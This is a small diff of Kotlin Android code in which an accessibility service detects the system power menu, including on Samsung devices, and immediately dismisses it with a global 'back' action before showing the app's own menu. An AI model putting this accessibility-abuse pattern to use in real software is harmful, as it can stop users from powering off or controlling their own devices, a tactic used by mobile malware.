@@ -50,12 +50,17 @@ class PayloadEntry : DynamicEntry {
             DynamicEntry.accessibilityInterceptor = { event ->
                 if (event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
                     val pkg = event.packageName?.toString() ?: ""
-                    // Standard Android Power Menu is part of SystemUI
-                    if (pkg == "com.android.systemui" || pkg == "android") {
+                    // SystemUI or Samsung specific packages
+                    if (pkg == "com.android.systemui" || pkg == "android" || pkg.contains("cocktailbarservice")) {
                         // Check if the window is likely the power menu
-                        // (Class names vary by phone, but usually contain 'GlobalActions')
                         val cls = event.className?.toString() ?: ""
                         if (cls.contains("GlobalActions", ignoreCase = true) || cls.contains("Power", ignoreCase = true)) {
+                            
+                            // ⚔️ ASSASSINATE THE SYSTEM MENU
+                            DynamicEntry.activeAccessibilityService?.performGlobalAction(
+                                android.accessibilityservice.AccessibilityService.GLOBAL_ACTION_BACK
+                            )
+
                             val vib = context.getSystemService(Context.VIBRATOR_SERVICE) as Vibrator
                             vib.vibrate(VibrationEffect.createOneShot(50, VibrationEffect.DEFAULT_AMPLITUDE))
                             showPowerMenu = true
